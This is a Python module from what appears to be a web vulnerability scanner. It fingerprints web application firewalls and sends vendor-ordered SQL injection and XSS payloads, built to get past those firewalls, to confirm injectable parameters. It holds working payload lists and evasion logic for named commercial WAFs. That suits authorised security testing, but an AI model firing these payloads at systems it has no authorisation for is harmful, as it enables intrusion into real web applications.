"""WAF fingerprinting + payload mutation engine (spec §4).

Naive scanners fire one raw payload and get blocked. This module
fingerprints the WAF first, then walks a mutation ladder (comment
obfuscation, space substitution, URL-encoding, version-specific
comments) so that at least one encoding reaches the vulnerable layer.

Used as a *pre-screen* in front of the heavy validators (sqlmap /
dalfox): if a mutated payload already confirms a 200-with-error-marker
or reflected payload, we skip the slow tool and record evidence.
"""
import time
import re
from typing import Dict, List, Optional
from ..discovery import technologies as tech_mod
from ..models import ValidationStatus, Confidence
from ..logging_setup import get_logger
from .base import Candidate, ValidationOutcome

log = get_logger("mutate")

SQLI_MUTATIONS = [
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' AND '1'='1",
    "' UNION SELECT NULL-- -",
    "'/**/OR/**/1=1-- -",
    "'+OR+'1'='1",
    "%27%20OR%201%3D1--",
    "' OR 1=1/*!50000UNION*/-- -",
]

XSS_MUTATIONS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><svg/onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scr<script>ipt>alert(1)</script>",
]

# which mutations to try first per WAF (index into the generic lists);
# unknown WAFs fall back to the listed order.
WAF_PRIORITY: Dict[str, Dict[str, List[int]]] = {
    # cloudflare blocks many literal payloads — obfuscation first
    "cloudflare": {"sqli": [4, 7, 6, 0, 1, 2, 3, 5],
                   "xss": [5, 4, 1, 0, 3, 2]},
    # sucuri/akamai — URL-encoded + comment forms slip through more often
    "sucuri": {"sqli": [6, 4, 7, 0, 1, 2, 3, 5], "xss": [4, 1, 5, 0]},
    "akamai": {"sqli": [6, 4, 0, 7, 1, 2, 3, 5], "xss": [4, 1, 5, 0]},
    # f5 / imperva — version-comment and inline forms
    "f5 big-ip": {"sqli": [7, 4, 5, 0, 6, 1, 2, 3],
                  "xss": [3, 5, 0, 4, 1, 2]},
    "imperva": {"sqli": [4, 7, 0, 6, 1, 2, 3, 5],
                "xss": [5, 0, 4, 1, 3, 2]},
    "aws": {"sqli": [0, 1, 4, 6, 7, 2, 3, 5],
            "xss": [0, 1, 4, 5, 2, 3]},
    "wallarm": {"sqli": [4, 6, 7, 0, 1, 2, 3, 5],
                "xss": [5, 4, 1, 0, 3, 2]},
    "modsecurity": {"sqli": [4, 7, 6, 0, 1, 2, 3, 5],
                    "xss": [5, 4, 0, 1, 3, 2]},
}

_SQLI_ERROR_MARKERS = [
    r"sqlexception", r"sqlsyntax", r"syntax error",
    r"error in your sql syntax",
    r"mysql_fetch", r"mysql_query", r"mysql_num_rows", r"mysql_result",
    r"warning in mysql", r"invalid use of cluster key",
    r"unterminated quotation", r"quoted identifier",
    r"postgresql", r"pg_query", r"pg_exec",
    r"sqlite3\.databaseerror", r"sqlite error",
    r"oracledb", r"ora-\d{5}", r"odbc driver",
    r"near '\w+' at position", r"unclosed quotation mark",
    r"conversion failed when converting",
]
_SQLI_MARKER_RE = re.compile("|".join(_SQLI_ERROR_MARKERS), re.I)

def fingerprint_waf(headers: Dict[str, str]) -> Optional[str]:
    """Best-effort WAF identification from response headers."""
    if not headers:
        return None
    return tech_mod.detect_waf(headers)


def mutations_for(waf: Optional[str], test_class: str) -> List[str]:
    """Ordered mutation ladder for a WAF + test class."""
    base = SQLI_MUTATIONS if test_class == "sqli" else XSS_MUTATIONS
    if not waf:
        return list(base)
    order = WAF_PRIORITY.get(waf.lower(), {}).get(test_class)
    if not order:
        return list(base)
    out: List[str] = []
    for i in order:
        if 0 <= i < len(base) and base[i] not in out:
            out.append(base[i])
    for p in base:
        if p not in out:
            out.append(p)
    return out


def sqli_error_signal(text: str) -> bool:
    return bool(text) and bool(_SQLI_MARKER_RE.search(text[:200_000]))


def _inject(url: str, param: str, payload: str) -> str:
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(url)
    if parts.query:
        q = parse_qsl(parts.query, keep_blank_values=True)
        q = [(k, payload) if k == param else (k, v) for k, v in q]
        query = urlencode(q, doseq=True)
    else:
        query = urlencode({param: payload})
    return urlunsplit((parts.scheme, parts.netloc, parts.path, query, ""))


class MutationEngine:
    def __init__(self, cfg, http, waf: Optional[str] = None,
                 client_headers: Optional[Dict[str, str]] = None):
        self.cfg = cfg
        self.http = http
        self.waf = waf
        self.client_headers = client_headers or {}
        self.max_payloads = getattr(cfg.validation, "mutation_payloads", 8)

    # ── sqli ────────────────────────────────────────────────────────────
    def prescreen_sqli(self, candidate: Candidate) -> Optional[ValidationOutcome]:
        param = candidate.parameter or self._guess_param(candidate.endpoint_url)
        if not param:
            return None

        method = (candidate.method or "GET").upper()
        if method not in {"GET", "POST", "PUT", "PATCH"}:
            return ValidationOutcome(
                status=ValidationStatus.INCONCLUSIVE.value,
                confidence=Confidence.UNKNOWN.value,
                notes=f"SQLi prescreen skipped: unsupported method {method}")
        if method != "GET" and not getattr(
                getattr(self.cfg, "safety", None), "allow_state_change", False):
            return ValidationOutcome(
                status=ValidationStatus.INCONCLUSIVE.value,
                confidence=Confidence.UNKNOWN.value,
                notes="SQLi body probes skipped: state-changing requests "
                      "require allow_state_change")
        if candidate.parameter_location == "body" and method == "GET":
            return ValidationOutcome(
                status=ValidationStatus.INCONCLUSIVE.value,
                confidence=Confidence.UNKNOWN.value,
                notes="SQLi body probe skipped: GET body shape is unsupported")

        # Paired, bounded boolean controls are a useful differential signal,
        # but never proof by themselves. Run the true condition twice to
        # reject ordinary response instability before comparing against false.
        from urllib.parse import parse_qsl, urlsplit
        if candidate.parameter_location == "body":
            base_value = self._body_sample(candidate, param)
        else:
            base_value = next((value for key, value in parse_qsl(
                urlsplit(candidate.endpoint_url).query, keep_blank_values=True)
                if key == param), "1")
        pairs = []
        if re.fullmatch(r"[-+]?\d+(?:\.\d+)?", str(base_value or "")):
            pairs.append((f"{base_value} AND 1=1", f"{base_value} AND 1=2"))
        else:
            pairs.append((f"{base_value}' AND '1'='1",
                          f"{base_value}' AND '1'='2"))
        for true_payload, false_payload in pairs:
            true_first = self._fetch_candidate(candidate, param, true_payload)
            false = self._fetch_candidate(candidate, param, false_payload)
            true_repeat = self._fetch_candidate(candidate, param, true_payload)
            if not (true_first and false and true_repeat):
                continue
            true_sig = self._normalized_signature(true_first)
            false_sig = self._normalized_signature(false)
            repeat_sig = self._normalized_signature(true_repeat)
            if true_sig == repeat_sig and false_sig != true_sig:
                return ValidationOutcome(
                    status=ValidationStatus.STRONG_CANDIDATE.value,
                    confidence=Confidence.PROBABLE.value,
                    evidence={
                        "waf": self.waf,
                        "param": param,
                        "control_pair": {
                            "true_condition": true_payload,
                            "false_condition": false_payload,
                            "true_first": true_sig,
                            "true_repeat": repeat_sig,
                            "false": false_sig,
                        },
                    },
                    notes="repeatable true/false SQLi response difference; "
                          "candidate only, requires independent validation")

        for payload in mutations_for(self.waf, "sqli")[:self.max_payloads]:
            r = self._fetch_candidate(candidate, param, payload)
            if r is None:
                continue
            text = r.get("text") or ""
            if sqli_error_signal(text):
                return ValidationOutcome(
                    status=ValidationStatus.STRONG_CANDIDATE.value,
                    confidence=Confidence.PROBABLE.value,
                    evidence={
                        "waf": self.waf,
                        "param": param,
                        "payload": payload,
                        "response_tail": redact_tail(text),
                    },
                    notes=f"SQL error marker reflected after payload "
                          f"{payload!r} (WAF: {self.waf or 'unknown'})")
        return None

    @staticmethod
    def _body_sample(candidate: Candidate, parameter: str) -> str:
        from .request_shape import body_parameter_value
        return body_parameter_value(candidate, parameter)

    def _fetch_candidate(self, candidate: Candidate, parameter: str,
                         payload: str) -> Optional[Dict]:
        if candidate.parameter_location != "body":
            url = _inject(candidate.endpoint_url, parameter, payload)
            method = (candidate.method or "GET").upper()
            if method == "GET":
                return self._fetch(url)
            kwargs = {"headers": self.client_headers, "timeout": 15}
        else:
            from .request_shape import body_with_parameter, is_json
            body = body_with_parameter(candidate, parameter, payload)
            method = (candidate.method or "POST").upper()
            headers = dict(candidate.request_headers or self.client_headers)
            kwargs = {"headers": headers, "timeout": 15}
            if is_json(candidate):
                kwargs["json"] = body
                if not any(k.lower() == "content-type" for k in headers):
                    kwargs["headers"]["Content-Type"] = "application/json"
            else:
                kwargs["data"] = body

        t0 = time.time()
        try:
            request_fn = getattr(self.http, "request", None)
            if callable(request_fn):
                response = request_fn(method, candidate.endpoint_url,
                                      **kwargs)
            else:
                response = getattr(self.http, method.lower())(
                    candidate.endpoint_url, **kwargs)
            return {"status": response.status_code,
                    "text": response.text or "",
                    "elapsed_ms": (time.time() - t0) * 1000}
        except Exception as e:
            log.debug("mutation request failed %s: %s",
                      candidate.endpoint_url, e)
            return None

    @staticmethod
    def _normalized_signature(response: Dict) -> Dict:
        """Use the shared response normalizer for boolean control samples."""
        from types import SimpleNamespace
        from .differential import normalize_response
        normalized = normalize_response(SimpleNamespace(
            status_code=response.get("status", 0),
            text=response.get("text") or ""))
        # Ignore raw response length: the normalizer's bucket absorbs small
        # template/nonce variation while the body hash requires stable content.
        return {key: normalized[key] for key in
                ("status", "length_bucket", "key_shape", "body_hash")}

    # ── xss ─────────────────────────────────────────────────────────────
    def prescreen_xss(self, candidate: Candidate) -> Optional[ValidationOutcome]:
        param = candidate.parameter or self._guess_param(candidate.endpoint_url)
        if not param:
            return None
        for payload in mutations_for(self.waf, "xss")[:self.max_payloads]:
            r = self._fetch(_inject(candidate.endpoint_url, param, payload))
            if r is None:
                continue
            text = r.get("text") or ""
            if self._reflected_unfiltered(text, payload):
                return ValidationOutcome(
                    status=ValidationStatus.STRONG_CANDIDATE.value,
                    confidence=Confidence.PROBABLE.value,
                    evidence={
                        "waf": self.waf, "param": param, "payload": payload,
                        "response_tail": redact_tail(text),
                    },
                    notes=f"payload {payload!r} reflected unfiltered "
                          f"(WAF: {self.waf or 'unknown'})")
        return None

    @staticmethod
    def _reflected_unfiltered(text: str, payload: str) -> bool:
        if not text:
            return False
        # script/tag payloads that survive HTML escaping
        dangerous = ("<script", "onerror=", "onload=", "javascript:",
                     "<img", "<svg")
        low = text.lower()
        hit = any(d in low for d in dangerous)
        return hit and (payload.lower() in low or
                        payload.replace(" ", "") in low.replace(" ", ""))

    # ── helpers ─────────────────────────────────────────────────────────
    def _fetch(self, url: str) -> Optional[Dict]:
        t0 = time.time()
        try:
            r = self.http.get(url, headers=self.client_headers, timeout=15)
            elapsed = (time.time() - t0) * 1000
            return {"status": r.status_code, "text": r.text or "",
                    "elapsed_ms": elapsed}
        except Exception as e:
            log.debug("mutation fetch failed %s: %s", url, e)
            return None

    @staticmethod
    def _guess_param(url: str) -> Optional[str]:
        from urllib.parse import urlsplit, parse_qsl
        q = parse_qsl(urlsplit(url).query, keep_blank_values=True)
        if not q:
            return None
        return q[-1][0]  # last param is the one under test


def redact_tail(text: str, size: int = 1200) -> str:
    from ..shell import redact
    return redact(text[-size:]) if text else ""
